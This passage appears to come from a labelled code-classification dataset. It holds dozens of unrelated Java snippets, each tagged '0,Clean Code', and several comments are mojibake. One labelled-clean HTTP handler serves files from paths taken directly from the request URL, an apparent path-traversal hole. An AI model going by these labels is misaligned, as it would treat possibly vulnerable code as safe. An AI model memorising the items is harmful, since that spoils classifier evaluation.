    addAvailableCharsetNames(model);
  }
}
",0,Clean Code
"public static Object execute(String expression,Map<String,Object> args){
  try {
    Expression compile=AviatorEvaluator.compile(expression);
    return compile.execute(args);
  }
 catch (  Exception e) {
    log.info(""expression:{}"",expression);
    log.error(e.getMessage());
    throw new BusinessException(ModuleCodeEnum.EXPRESSION_PARSE_ERROR);
  }
}
/** 
 * 鎵ц琛ㄨ揪寮
 * @param formulaBO
 * @return
 */
public static Object execute(ModuleFormulaBO formulaBO){
  if (CollUtil.isNotEmpty(formulaBO.getVars()) && MapUtil.isEmpty(formulaBO.getEnv())) {
    throw new BusinessException(ModuleCodeEnum.EXPRESSION_ARG_ERROR);
  }
  log.info(""formula:{}"",formulaBO);
  String expression=formulaBO.getExpression();
  Set<String> args=ExpressionUtil.parseArgs(expression,ExpressionUtil.REGEX_ALL);
  Map<String,Object> env=new HashMap<>(16);
  for (  String arg : args) {
    String randomStr=getRandomStr(10);
    expression=expression.replace(arg,randomStr);
    if (MapUtil.isNotEmpty(formulaBO.getEnv()) && formulaBO.getEnv().containsKey(arg)) {
      env.put(randomStr,formulaBO.getEnv().get(arg));
    }
    if (MapUtil.isNotEmpty(formulaBO.getSourceEnv()) && formulaBO.getSourceEnv().containsKey(arg)) {
      env.put(randomStr,formulaBO.getSourceEnv().get(arg));
    }
  }
  return execute(expression,env);
}",0,Clean Code
"/** 
 * <code>optional .EntityMotion entity_motion = 7;</code>
 * @param value the entityMotion to set
 * @return this
 */
public SceneEntityTeleportScRsp setEntityMotion(final EntityMotionOuterClass.EntityMotion value){
  bitField0_|=0x00000004;
  entityMotion.copyFrom(value);
  return this;
}",0,Clean Code
"@Override public ActionResult delete(Long id){
  if (RoleCodeEnum.DESKTOP.getDefaultUserId().equals(id) || RoleCodeEnum.ADMIN.getDefaultUserId().equals(id)) {
    throw new BusinessException(""user.canNotOperateSystemAccount"");
  }
  getDbhubUserMapper().deleteById(id);
  LambdaQueryWrapper<TeamUserDO> teamUserQueryWrapper=new LambdaQueryWrapper<>();
  teamUserQueryWrapper.eq(TeamUserDO::getUserId,id);
  getTeamUserMapper().delete(teamUserQueryWrapper);
  LambdaQueryWrapper<DataSourceAccessDO> dataSourceAccessQueryWrapper=new LambdaQueryWrapper<>();
  dataSourceAccessQueryWrapper.eq(DataSourceAccessDO::getAccessObjectId,id).eq(DataSourceAccessDO::getAccessObjectType,AccessObjectTypeEnum.USER.getCode());
  getDataSourceAccessMapper().delete(dataSourceAccessQueryWrapper);
  return ActionResult.isSuccess();
}
",0,Clean Code
"public Language getLanguage(){
  return language;
}
",0,Clean Code
"public static void allowEarlyInit(@NonNull IDynamicHook hook){
  try {
    if (hook.isTargetProcess() && hook.isEnabled() && !hook.isPreparationRequired()&& !hook.isInitialized()) {
      hook.initialize();
    }
  }
 catch (  Throwable e) {
    if (hook instanceof RuntimeErrorTracer) {
      ((RuntimeErrorTracer)hook).traceError(e);
    }
 else {
      Log.e(e);
    }
  }
}
",0,Clean Code
"boolean closing(TabButtonComponent btc);
",0,Clean Code
"@Override @SneakyThrows protected void awaitUntilPersisted(){
  Thread.sleep(2000);
}",0,Clean Code
"void visitFloat(Double value);
",0,Clean Code
"public void showAdvanced(ActionEvent event){
  AdvancedDialog advancedDialog=new AdvancedDialog(walletForm);
  advancedDialog.initOwner(apply.getScene().getWindow());
  Optional<Boolean> optApply=advancedDialog.showAndWait();
  if (optApply.isPresent() && optApply.get() && walletForm.getWallet().isValid()) {
    revert.setDisable(true);
    apply.setDisable(true);
    saveWallet(false,true);
  }
}
",0,Clean Code
"@Test public void testSearchV2WithParamsWithManagedChannel(){
  WorkflowClient workflowClient=createClientWithManagedChannel();
  Workflow workflow=mock(Workflow.class);
  WorkflowPb.Workflow workflowPB=mock(WorkflowPb.Workflow.class);
  when(mockedProtoMapper.fromProto(workflowPB)).thenReturn(workflow);
  WorkflowServicePb.WorkflowSearchResult result=WorkflowServicePb.WorkflowSearchResult.newBuilder().addResults(workflowPB).setTotalHits(1).build();
  SearchPb.Request searchRequest=SearchPb.Request.newBuilder().setStart(1).setSize(5).setSort(""*"").setFreeText(""*"").setQuery(""test query"").build();
  when(mockedStub.searchV2(searchRequest)).thenReturn(result);
  SearchResult<Workflow> searchResult=workflowClient.searchV2(1,5,""*"",""*"",""test query"");
  assertEquals(1,searchResult.getTotalHits());
  assertEquals(workflow,searchResult.getResults().get(0));
}",0,Clean Code
"@Override public PerformanceTestResult parse(PerformanceTestResult performanceTestResult,Logger logger){
  if (performanceTestResult == null || performanceTestResult.performanceInspectionResults == null || performanceTestResult.performanceInspectionResults.isEmpty()) {
    return null;
  }
  List<PerformanceInspectionResult> inspectionResults=performanceTestResult.performanceInspectionResults;
  for (  PerformanceInspectionResult inspectionResult : inspectionResults) {
    File hprofFile=inspectionResult.rawResultFile;
    if (hprofFile == null) {
      return performanceTestResult;
    }
    inspectionResult.parsedData=buildAndroidHprofMemoryInfo(hprofFile,inspectionResult.inspection.appId,inspectionResult.inspection.description,inspectionResult.timestamp,logger);
  }
  return performanceTestResult;
}
",0,Clean Code
"public GraphDisplaySettings(final GraphViewSettingsConfigItem initialSettings){
  animationSpeed=initialSettings.getAnimationSpeed();
}
",0,Clean Code
"@Override public void handle(HttpExchange exchange) throws IOException {
  String url=exchange.getRequestURI().getPath();
  byte[] content;
  if (url.endsWith("".js"")) {
    Path path=Paths.get(NameUtil.getOutputPath(),url);
    content=Files.readAllBytes(path);
    exchange.getResponseHeaders().set(""Content-Type"",""text/javascript"");
  }
 else {
    if (""/hello"".equals(url)) {
      content=""Hello"".getBytes(StandardCharsets.UTF_8);
    }
 else     if (""/stop"".equals(url)) {
      content=""Agent stop."".getBytes(StandardCharsets.UTF_8);
      IocContainer.stop();
    }
 else     if (url.endsWith(""flame-graph.html"")) {
      Path path=Paths.get(NameUtil.getOutputPath(),url);
      content=Files.readAllBytes(path);
    }
 else {
      Path path=Paths.get(NameUtil.getOutputPath(),NameUtil.getAnalysisHtmlName());
      content=Files.readAllBytes(path);
    }
    exchange.getResponseHeaders().set(""Content-Type"",""text/html"");
  }
  String acceptEncoding=exchange.getRequestHeaders().getFirst(""Accept-Encoding"");
  ByteArrayOutputStream baos=new ByteArrayOutputStream();
  if (acceptEncoding != null && acceptEncoding.contains(""gzip"")) {
    exchange.getResponseHeaders().set(""Content-Encoding"",""gzip"");
    try (GZIPOutputStream gzipOutputStream=new GZIPOutputStream(baos)){
      gzipOutputStream.write(content);
    }
   }
 else   if (acceptEncoding != null && acceptEncoding.contains(""deflate"")) {
    exchange.getResponseHeaders().set(""Content-Encoding"",""deflate"");
    try (DeflaterOutputStream deflaterOutputStream=new DeflaterOutputStream(baos)){
      deflaterOutputStream.write(content);
    }
   }
  byte[] compressData=baos.toByteArray();
  exchange.sendResponseHeaders(HTTP_OK,compressData.length);
  OutputStream os=exchange.getResponseBody();
  os.write(compressData);
  os.close();
}",0,Clean Code
"@Override public void afterTextChanged(Editable s){
  codePointCount=Character.codePointCount(s,0,s.length());
  String limitText=null;
  final int limit=getCaptionLimit();
  if (codePointCount + 25 > limit) {
    limitText="""" + (limit - codePointCount);
  }
  limitTextView.cancelAnimation();
  limitTextView.setText(limitText);
  limitTextView.setTextColor(codePointCount >= limit ? 0xffEC7777 : 0xffffffff);
  if (codePointCount > limit && !UserConfig.getInstance(currentAccount).isPremium() && codePointCount < getCaptionPremiumLimit() && codePointCount > lastLength && (captionLimitToast() || MessagesController.getInstance(currentAccount).premiumFeaturesBlocked())) {
    AndroidUtilities.shakeViewSpring(limitTextView,shiftDp=-shiftDp);
    BotWebViewVibrationEffect.APP_ERROR.vibrate();
  }
  lastLength=codePointCount;
  final boolean overLimit=codePointCount > limit;
  if (overLimit != lastOverLimit) {
    onCaptionLimitUpdate(overLimit);
  }
  lastOverLimit=overLimit;
  if (!ignoreTextChange) {
    AndroidUtilities.cancelRunOnUIThread(textChangeRunnable);
    AndroidUtilities.runOnUIThread(textChangeRunnable,1500);
  }
  ignoreTextChange=false;
  AndroidUtilities.runOnUIThread(() -> {
    waitingForScrollYChange=false;
  }
);
}",0,Clean Code
"@Override public boolean checkConfigKeyUnique(SysConfigEntity config){
  Long configId=StringUtils.isNull(config.getConfigId()) ? -1L : config.getConfigId();
  SysConfigEntity info=configMapper.checkConfigKeyUnique(config);
  if (StringUtils.isNotNull(info) && info.getConfigId().longValue() != configId.longValue()) {
    return false;
  }
  return true;
}",0,Clean Code
"public Builder maxTime(Double maxTime){
  this.maxTime=maxTime;
  return this;
}
",0,Clean Code
"private J maybeReplaceCompareWithNull(J.Binary asBinary,boolean valueIfEqual){
  Expression left=asBinary.getLeft();
  Expression right=asBinary.getRight();
  boolean leftIsNull=isNullLiteral(left);
  boolean rightIsNull=isNullLiteral(right);
  if (leftIsNull && rightIsNull) {
    return booleanLiteral(asBinary,valueIfEqual);
  }
  boolean leftIsNonNullLiteral=isNonNullLiteral(left);
  boolean rightIsNonNullLiteral=isNonNullLiteral(right);
  if ((leftIsNull && rightIsNonNullLiteral) || (rightIsNull && leftIsNonNullLiteral)) {
    return booleanLiteral(asBinary,!valueIfEqual);
  }
  return asBinary;
}
",0,Clean Code
"public Object[] getArray(){
  return array;
}
",0,Clean Code
"public void setDevName(String str){
  this.devName=str;
}
",0,Clean Code
"public void getBubbleBounds(RectF rect){
  float left=Integer.MAX_VALUE;
  float right=Integer.MIN_VALUE;
  float top=Integer.MAX_VALUE;
  float bottom=Integer.MIN_VALUE;
  for (int i=0; i < listView.getChildCount(); ++i) {
    View child=listView.getChildAt(i);
    if (child instanceof ChatMessageCell) {
      ChatMessageCell cell=(ChatMessageCell)child;
      float cleft, ctop, cright, cbottom;
      if (cell.getMessageObject() != null && cell.getMessageObject().isRoundVideo() && cell.getPhotoImage() != null) {
        cleft=container.getX() + cell.getX() + cell.getPhotoImage().getImageX();
        cright=container.getX() + cell.getX() + cell.getPhotoImage().getImageX2();
        ctop=container.getY() + cell.getY() + cell.getPhotoImage().getImageY();
        cbottom=container.getY() + cell.getY() + cell.getPhotoImage().getImageY2();
      }
 else {
        cleft=container.getX() + child.getX() + cell.getBackgroundDrawableLeft()+ dp(1);
        if (groupedMessages == null) {
          cleft+=dp(8);
        }
        cright=container.getX() + child.getX() + cell.getBackgroundDrawableRight() - dp(1);
        ctop=container.getY() + child.getY() + cell.getBackgroundDrawableTop()+ dp(1.33f);
        cbottom=container.getY() + child.getY() + cell.getBackgroundDrawableBottom() - dp(.66f);
      }
      left=Math.min(left,cleft);
      left=Math.min(left,cright);
      right=Math.max(right,cleft);
      right=Math.max(right,cright);
      top=Math.min(top,ctop);
      top=Math.min(top,cbottom);
      bottom=Math.max(bottom,ctop);
      bottom=Math.max(bottom,cbottom);
    }
  }
  rect.set(left,top,right,bottom);
}",0,Clean Code
"@Bean public ExecutionService executionService(){
  return mock(ExecutionService.class);
}
",0,Clean Code
"public void switchCamera(){
  if (flipping || System.currentTimeMillis() < toggleDualUntil && !dualCameraAppeared) {
    return;
  }
  if (dual) {
    if (!dualCameraAppeared || System.currentTimeMillis() - lastDualSwitchTime < 420) {
      return;
    }
    lastDualSwitchTime=System.currentTimeMillis();
    CameraInfo info0=info[0];
    info[0]=info[1];
    info[1]=info0;
    Size previewSize0=previewSize[0];
    previewSize[0]=previewSize[1];
    previewSize[1]=previewSize0;
    Size pictureSize0=pictureSize[0];
    pictureSize[0]=pictureSize[1];
    pictureSize[1]=pictureSize0;
    CameraSessionWrapper cameraSession0=cameraSession[0];
    cameraSession[0]=cameraSession[1];
    cameraSession[1]=cameraSession0;
    isFrontface=!isFrontface;
    Handler handler=cameraThread.getHandler();
    if (handler != null) {
      handler.sendMessage(handler.obtainMessage(cameraThread.DO_DUAL_FLIP));
    }
    return;
  }
  startSwitchingAnimation();
  if (cameraSession[0] != null) {
    if (cameraSessionRecording == cameraSession[0]) {
      cameraSessionRecording=null;
    }
    cameraSession[0].destroy(false,null,() -> {
      inited=false;
synchronized (layoutLock) {
        firstFrameRendered=false;
      }
      updateCameraInfoSize(0);
      cameraThread.reinitForNewCamera();
    }
);
    cameraSession[0]=null;
  }
  isFrontface=!isFrontface;
}",0,Clean Code
"ExternalMethod1Node create(ExpressionNode receiverNode,ExpressionNode arg1Node);",0,Clean Code
"private void sanitizeLinks(PDDocument document) throws IOException {
  for (  PDPage page : document.getPages()) {
    for (    PDAnnotation annotation : page.getAnnotations()) {
      if (annotation != null && annotation instanceof PDAnnotationLink) {
        PDAction action=((PDAnnotationLink)annotation).getAction();
        if (action != null && (action instanceof PDActionLaunch || action instanceof PDActionURI)) {
          ((PDAnnotationLink)annotation).setAction(null);
        }
      }
    }
  }
}
",0,Clean Code
"private void writeChecksums(Checksums checksums) throws IOException {
  jsonWriter.beginObject();
  jsonWriter.name(""sha256"").value(checksums.getSha256());
  jsonWriter.endObject();
}",0,Clean Code
"/** 
 * Verify that the JWT header has the required properties and that the values are valid
 */
@Test public void testThatDecodedJWTHasAValidHeader() throws Exception {
  String[] args={""../""};
  TestingProcessManager.TestingProcess process=TestingProcessManager.start(args);
  assertNotNull(process.checkOrWaitForEvent(ProcessState.PROCESS_STATE.STARTED));
  String algorithm=""RS256"";
  JsonObject payload=new JsonObject();
  payload.addProperty(""customClaim"",""customValue"");
  String jwksDomain=""http://localhost"";
  long validity=3600;
  String jwt=JWTSigningFunctions.createJWTToken(process.getProcess(),algorithm,payload,jwksDomain,validity,false);
  DecodedJWT decodedJWT=JWT.decode(jwt);
  Claim headerAlg=decodedJWT.getHeaderClaim(""alg"");
  Claim headerType=decodedJWT.getHeaderClaim(""typ"");
  Claim headerKeyId=decodedJWT.getHeaderClaim(""kid"");
  if (headerAlg.isNull() || headerType.isNull() || headerKeyId.isNull()) {
    throw new Exception(""JWT header is missing one or more required claim (alg, typ, kid)"");
  }
  if (!headerAlg.asString().equals(algorithm)) {
    throw new Exception(""Algorithm in JWT header does not match algorithm passed to JWTSigningFunctions.createJWTToken"");
  }
  if (!headerType.asString().equals(""JWT"")) {
    throw new Exception(""JWT header contains wrong type: Expected: JWT, Actual: "" + headerType.asString());
  }
  if (headerKeyId.asString().isEmpty()) {
    throw new Exception(""Value for kid in JWT header is invalid"");
  }
  process.kill();
  assertNotNull(process.checkOrWaitForEvent(ProcessState.PROCESS_STATE.STOPPED));
}",0,Clean Code
"@Test public void withInFiltersExpressions1(){
  contextRunner.run(context -> {
    VectorStore vectorStore=context.getBean(VectorStore.class);
    vectorStore.add(List.of(new Document(""1"",""Article by john"",Map.of(""author"",""john"")),new Document(""2"",""Article by Jack"",Map.of(""author"",""jack"")),new Document(""3"",""Article by Jill"",Map.of(""author"",""jill""))));
    String query=""Give me articles by john"";
    List<Document> results=vectorStore.similaritySearch(SearchRequest.query(query).withTopK(5));
    assertThat(results).hasSize(3);
    results=vectorStore.similaritySearch(SearchRequest.query(query).withTopK(5).withSimilarityThresholdAll().withFilterExpression(""author in ['john', 'jill']""));
    assertThat(results).hasSize(2);
    assertThat(results.stream().map(d -> d.getId()).toList()).containsExactlyInAnyOrder(""1"",""3"");
  }
);
}",0,Clean Code
"@Subscribe public void versionCheckStatus(VersionCheckStatusEvent event){
  versionCheckService.cancel();
  if (Config.get().getMode() != Mode.OFFLINE && event.isEnabled() && Network.get() == Network.MAINNET) {
    versionCheckService=createVersionCheckService();
    versionCheckService.start();
  }
}
",0,Clean Code
"@Override public RefreshTriggerByClientCsReq clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  triggerMotion.clearQuick();
  triggerName.clear();
  triggerTargetIdList.clear();
  return this;
}",0,Clean Code
"@Test public void testBlockAfterAvailablePermitsExhausted() throws Exception {
  int threads=5;
  ExecutorService executorService=Executors.newFixedThreadPool(threads);
  SemaphoreUtil semaphoreUtil=new SemaphoreUtil(threads);
  List<CompletableFuture<Void>> futuresList=new ArrayList<>();
  IntStream.range(0,threads).forEach(t -> futuresList.add(CompletableFuture.runAsync(() -> semaphoreUtil.acquireSlots(1),executorService)));
  CompletableFuture<Void> allFutures=CompletableFuture.allOf(futuresList.toArray(new CompletableFuture[futuresList.size()]));
  allFutures.get();
  assertEquals(0,semaphoreUtil.availableSlots());
  assertFalse(semaphoreUtil.acquireSlots(1));
  executorService.shutdown();
}",0,Clean Code
"public RedisQueuesShardingStrategyProvider(ShardSupplier shardSupplier,RedisProperties properties){
  this.shardSupplier=shardSupplier;
  this.properties=properties;
}
",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 1;</code>
 * @param value the retcode to set
 * @return this
 */
public GetSceneMapInfoScRsp setRetcode(final int value){
  bitField0_|=0x00000001;
  retcode=value;
  return this;
}",0,Clean Code
"@Override public boolean onInterceptTouchEvent(MotionEvent ev){
  if (rightFragmentOpenedProgress == 0 && !isTopic && storyParams.checkOnTouchEvent(ev,this)) {
    return true;
  }
  return super.onInterceptTouchEvent(ev);
}",0,Clean Code
"static float dotProduct256(MemorySegmentVectorFloat v1,int v1offset,MemorySegmentVectorFloat v2,int v2offset,int length){
  if (length == FloatVector.SPECIES_256.length())   return dot256(v1,v1offset,v2,v2offset);
  final int vectorizedLength=FloatVector.SPECIES_256.loopBound(length);
  FloatVector sum=FloatVector.zero(FloatVector.SPECIES_256);
  int i=0;
  for (; i < vectorizedLength; i+=FloatVector.SPECIES_256.length()) {
    FloatVector a=FloatVector.fromMemorySegment(FloatVector.SPECIES_256,v1.get(),v1.offset(v1offset + i),ByteOrder.LITTLE_ENDIAN);
    FloatVector b=FloatVector.fromMemorySegment(FloatVector.SPECIES_256,v2.get(),v1.offset(v2offset + i),ByteOrder.LITTLE_ENDIAN);
    sum=a.fma(b,sum);
  }
  float res=sum.reduceLanes(VectorOperators.ADD);
  for (; i < length; ++i)   res+=v1.get(v1offset + i) * v2.get(v2offset + i);
  return res;
}",0,Clean Code
"@Override public ModelOptions getOptions(){
  return speechOptions;
}
",0,Clean Code
"@Override public int getContentResId(){
  return R.xml.framework;
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(serverPrefs);
  }
  return size;
}",0,Clean Code
"public static String getPluralString(String key,int plural){
  if (key == null || key.length() == 0 || getInstance().currentPluralRules == null) {
    return ""LOC_ERR:"" + key;
  }
  String param=getInstance().stringForQuantity(getInstance().currentPluralRules.quantityForNumber(plural));
  param=key + ""_"" + param;
  int resourceId=ApplicationLoader.applicationContext.getResources().getIdentifier(param,""string"",ApplicationLoader.applicationContext.getPackageName());
  int fallbackResourceId=ApplicationLoader.applicationContext.getResources().getIdentifier(key + ""_other"",""string"",ApplicationLoader.applicationContext.getPackageName());
  return getString(param,key + ""_other"",resourceId,fallbackResourceId);
}",0,Clean Code
"protected void visitStatement(@Nullable ProtoRightPadded<Proto> paddedStat,PrintOutputCapture<P> p){
  if (paddedStat == null) {
    return;
  }
  visit(paddedStat.getElement(),p);
  visitSpace(paddedStat.getAfter(),p);
  Proto s=paddedStat.getElement();
  if (s instanceof Proto.Empty || s instanceof Proto.Field || s instanceof Proto.Import|| s instanceof Proto.MapField|| s instanceof Proto.EnumField|| s instanceof Proto.OptionDeclaration|| s instanceof Proto.Package|| s instanceof Proto.Reserved|| (s instanceof Proto.Rpc && ((Proto.Rpc)s).getBody() == null)|| s instanceof Proto.Syntax) {
    p.append(';');
  }
}
",0,Clean Code
"@Override public boolean accept(final Object left,final Object right){
  if (left == right) {
    return true;
  }
  if (left == null || right == null) {
    return true;
  }
  Class<?> lCs=left.getClass();
  Class<?> rCs=right.getClass();
  if (isArray(lCs,rCs) || isCollection(lCs,rCs) || isMap(lCs,rCs)) {
    return false;
  }
  if (lCs != rCs) {
    return true;
  }
  return isBasicType(lCs,rCs) || isBothJavaLang(lCs,rCs) || isBothJavaMath(lCs,rCs)|| isBothJavaTime(lCs,rCs)|| isBothJavaUtil(lCs,rCs);
}
",0,Clean Code
"static float squareDistance(ArrayVectorFloat v1,ArrayVectorFloat v2){
  return squareDistance(v1,0,v2,0,v1.length());
}
static float squareDistance(ArrayVectorFloat v1,int v1offset,ArrayVectorFloat v2,int v2offset,final int length){
  if (length >= FloatVector.SPECIES_PREFERRED.length())   return squareDistancePreferred(v1,v1offset,v2,v2offset,length);
  if (length < FloatVector.SPECIES_128.length())   return squareDistance64(v1,v1offset,v2,v2offset,length);
 else   if (length < FloatVector.SPECIES_256.length())   return squareDistance128(v1,v1offset,v2,v2offset,length);
 else   return squareDistance256(v1,v1offset,v2,v2offset,length);
}",0,Clean Code
"@Override public IStateAction<CBendEnterState> createBendEnterAction(){
  return new CDefaultBendEnterAction();
}
",0,Clean Code
"public synchronized boolean removeUniqueItem(int uid,int count){
  GameItem item=this.getItemByUid(uid);
  if (item == null) {
    return false;
  }
  return removeItem(item,count);
}
",0,Clean Code
"@Override protected void endListing(VmListing value,boolean isEmpty){
}
",0,Clean Code
"public String withMetaPrefix(String identifier){
  if (this.allowedIdentifierNames.contains(identifier)) {
    return ""meta_"" + identifier;
  }
  throw new IllegalArgumentException(""Not allowed filter identifier name: "" + identifier);
}
",0,Clean Code
"@Override public void write(MemoryBuffer buffer,Map value){
  Preconditions.checkArgument(value.getClass() == type);
  Object fieldValue=Platform.getObject(value,offset);
  fury.writeRef(buffer,fieldValue);
}
",0,Clean Code
"public static TLRPC.Peer getSavedDialogPeer(long self,TLRPC.Message message){
  if (message.saved_peer_id != null) {
    return message.saved_peer_id;
  }
  if (message.peer_id != null && message.peer_id.user_id == self && message.from_id != null && message.from_id.user_id == self) {
    if (message.fwd_from != null && message.fwd_from.saved_from_peer != null) {
      return message.fwd_from.saved_from_peer;
    }
 else     if (message.fwd_from != null && message.fwd_from.from_id != null) {
      TLRPC.Peer peer=new TLRPC.TL_peerUser();
      peer.user_id=self;
      return peer;
    }
 else     if (message.fwd_from != null) {
      TLRPC.Peer peer=new TLRPC.TL_peerUser();
      peer.user_id=2666000L;
      return peer;
    }
 else {
      TLRPC.Peer peer=new TLRPC.TL_peerUser();
      peer.user_id=self;
      return peer;
    }
  }
  return null;
}",0,Clean Code
"public void loadAutoDownloadConfig(boolean force){
  if (loadingAutoDownloadConfig || !force && Math.abs(System.currentTimeMillis() - getUserConfig().autoDownloadConfigLoadTime) < 24 * 60 * 60* 1000) {
    return;
  }
  loadingAutoDownloadConfig=true;
  TLRPC.TL_account_getAutoDownloadSettings req=new TLRPC.TL_account_getAutoDownloadSettings();
  getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    loadingAutoDownloadConfig=false;
    getUserConfig().autoDownloadConfigLoadTime=System.currentTimeMillis();
    getUserConfig().saveConfig(false);
    if (response != null) {
      TLRPC.TL_account_autoDownloadSettings res=(TLRPC.TL_account_autoDownloadSettings)response;
      lowPreset.set(res.low);
      mediumPreset.set(res.medium);
      highPreset.set(res.high);
      for (int a=0; a < 3; a++) {
        Preset preset;
        if (a == 0) {
          preset=mobilePreset;
        }
 else         if (a == 1) {
          preset=wifiPreset;
        }
 else {
          preset=roamingPreset;
        }
        if (preset.equals(lowPreset)) {
          preset.set(res.low);
        }
 else         if (preset.equals(mediumPreset)) {
          preset.set(res.medium);
        }
 else         if (preset.equals(highPreset)) {
          preset.set(res.high);
        }
      }
      SharedPreferences.Editor editor=MessagesController.getMainSettings(currentAccount).edit();
      editor.putString(""mobilePreset"",mobilePreset.toString());
      editor.putString(""wifiPreset"",wifiPreset.toString());
      editor.putString(""roamingPreset"",roamingPreset.toString());
      editor.putString(""preset0"",lowPreset.toString());
      editor.putString(""preset1"",mediumPreset.toString());
      editor.putString(""preset2"",highPreset.toString());
      editor.commit();
      String str1=lowPreset.toString();
      String str2=mediumPreset.toString();
      String str3=highPreset.toString();
      checkAutodownloadSettings();
    }
  }
));
}",0,Clean Code
"/** 
 * Use variable length encoding for int. 
 */
public FuryBuilder withIntCompressed(boolean intCompressed){
  this.compressInt=intCompressed;
  return this;
}
",0,Clean Code
"public List<CallGraphViewData> getCallGraphViewsData(){
  final ArrayList<CallGraphViewData> callGraphViews=new ArrayList<>();
  for (  final ViewData viewData : views) {
    if (viewData instanceof CallGraphViewData) {
      callGraphViews.add((CallGraphViewData)viewData);
    }
  }
  return callGraphViews;
}
",0,Clean Code
"private ExpressionNode doVisitSetLiteral(ExprContext ctx,ArgumentListContext argListCtx){
  var elementNodes=createCollectionArgumentNodes(argListCtx);
  if (elementNodes.first.length == 0) {
    return new ConstantValueNode(VmSet.EMPTY);
  }
  return elementNodes.second ? new ConstantValueNode(createSourceSection(ctx),VmSet.createFromConstantNodes(elementNodes.first)) : new SetLiteralNode(createSourceSection(ctx),elementNodes.first);
}",0,Clean Code
"public int getStreamType(){
  return this.streamType;
}
",0,Clean Code
"public static int createFloatArrayVector(FlatBufferBuilder builder,float[] data){
  builder.startVector(4,data.length,4);
  for (int i=data.length - 1; i >= 0; i--)   builder.addFloat(data[i]);
  return builder.endVector();
}",0,Clean Code
"@Override public String getProtoTypeDeclaration(){
  return String.format(""%s %s = %d"",getAbstractType().getProtoType(),toUnderscoreCase(getName()),getProtoIndex());
}
",0,Clean Code
"private void updateDownloadingListeners(){
  DownloadController downloadController=DownloadController.getInstance(currentAccount);
  HashMap<String,ProgressObserver> observerHashMap=new HashMap<>();
  for (int i=0; i < currentListeners.size(); i++) {
    observerHashMap.put(currentListeners.get(i).fileName,currentListeners.get(i));
    DownloadController.getInstance(currentAccount).removeLoadingFileObserver(currentListeners.get(i));
  }
  currentListeners.clear();
  for (int i=0; i < downloadController.downloadingFiles.size(); i++) {
    String filename=downloadController.downloadingFiles.get(i).getFileName();
    if (FileLoader.getInstance(currentAccount).isLoadingFile(filename)) {
      ProgressObserver progressObserver=observerHashMap.get(filename);
      if (progressObserver == null) {
        progressObserver=new ProgressObserver(filename);
      }
      DownloadController.getInstance(currentAccount).addLoadingFileObserver(filename,progressObserver);
      currentListeners.add(progressObserver);
    }
  }
  if (currentListeners.size() == 0 && (getVisibility() != View.VISIBLE || getAlpha() != 1f)) {
    progress=0;
    currentProgress=0;
  }
}",0,Clean Code
"public Any getTaskInputMessage(){
  return taskInputMessage;
}
",0,Clean Code
"@Operation(summary=""鍥炴斁鍊嶉熸挱鏀"",security=@SecurityRequirement(name=JwtUtils.HEADER)) @Parameter(name=""streamId"",description=""鍥炴斁娴両D"",required=true) @Parameter(name=""speed"",description=""鍊嶉0.25 0.5 1銆2銆4"",required=true) @GetMapping(""/speed/{streamId}/{speed}"") public void playSpeed(@PathVariable String streamId,@PathVariable Double speed){
  logger.info(""playSpeed: "" + streamId + "", ""+ speed);
  InviteInfo inviteInfo=inviteStreamService.getInviteInfoByStream(InviteSessionType.PLAYBACK,streamId);
  if (null == inviteInfo || inviteInfo.getStreamInfo() == null) {
    logger.warn(""streamId涓嶅瓨鍦!"");
    throw new ControllerException(ErrorCode.ERROR400.getCode(),""streamId涓嶅瓨鍦"");
  }
  if (speed != 0.25 && speed != 0.5 && speed != 1 && speed != 2.0 && speed != 4.0) {
    logger.warn(""涓嶆敮鎸佺殑speed锛 "" + speed);
    throw new ControllerException(ErrorCode.ERROR100.getCode(),""涓嶆敮鎸佺殑speed锛0.25 0.5 1銆2銆4锛"");
  }
  Device device=storager.queryVideoDevice(inviteInfo.getDeviceId());
  try {
    cmder.playSpeedCmd(device,inviteInfo.getStreamInfo(),speed);
  }
 catch (  InvalidArgumentException|ParseException|SipException e) {
    throw new ControllerException(ErrorCode.ERROR100.getCode(),e.getMessage());
  }
}",0,Clean Code
"@Override protected boolean processOutputBuffer(long positionUs,long elapsedRealtimeUs,MediaCodec codec,ByteBuffer buffer,int bufferIndex,int bufferFlags,long bufferPresentationTimeUs,boolean isDecodeOnlyBuffer,boolean isLastBuffer,Format format) throws ExoPlaybackException {
  if (codecNeedsEosBufferTimestampWorkaround && bufferPresentationTimeUs == 0 && (bufferFlags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0 && lastInputTimeUs != C.TIME_UNSET) {
    bufferPresentationTimeUs=lastInputTimeUs;
  }
  if (log.allowDebug()) {
    log.d(""processOutputBuffer: positionUs = "" + positionUs + "", elapsedRealtimeUs =  ""+ elapsedRealtimeUs+ "", bufferIndex = ""+ bufferIndex+ "", isDecodeOnlyBuffer = ""+ isDecodeOnlyBuffer+ "", isLastBuffer = ""+ isLastBuffer+ "", bufferPresentationTimeUs = ""+ bufferPresentationTimeUs);
  }
  if (passthroughEnabled && (bufferFlags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
    codec.releaseOutputBuffer(bufferIndex,false);
    return true;
  }
  if (isDecodeOnlyBuffer) {
    codec.releaseOutputBuffer(bufferIndex,false);
    decoderCounters.skippedOutputBufferCount++;
    audioSink.handleDiscontinuity();
    return true;
  }
  try {
    if (audioSink.handleBuffer(buffer,bufferPresentationTimeUs)) {
      codec.releaseOutputBuffer(bufferIndex,false);
      decoderCounters.renderedOutputBufferCount++;
      return true;
    }
  }
 catch (  AudioSink.InitializationException|AudioSink.WriteException e) {
    throw ExoPlaybackException.createForRenderer(e,getIndex());
  }
  return false;
}",0,Clean Code
"@Override public String toString(){
  return ""ChatServiceResponse{"" + ""chatServiceContext="" + chatServiceContext + "", chatResponse=""+ chatResponse+ '}';
}
",0,Clean Code
"@Override public void close(){
  amqpConnection.close();
}
",0,Clean Code
"@Override public PlayerDisplaySettings copyFrom(final PlayerDisplaySettings other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    nENFHJDADJA=other.nENFHJDADJA;
    oOAJONLNOKC=other.oOAJONLNOKC;
    bKFKEAOKJIC=other.bKFKEAOKJIC;
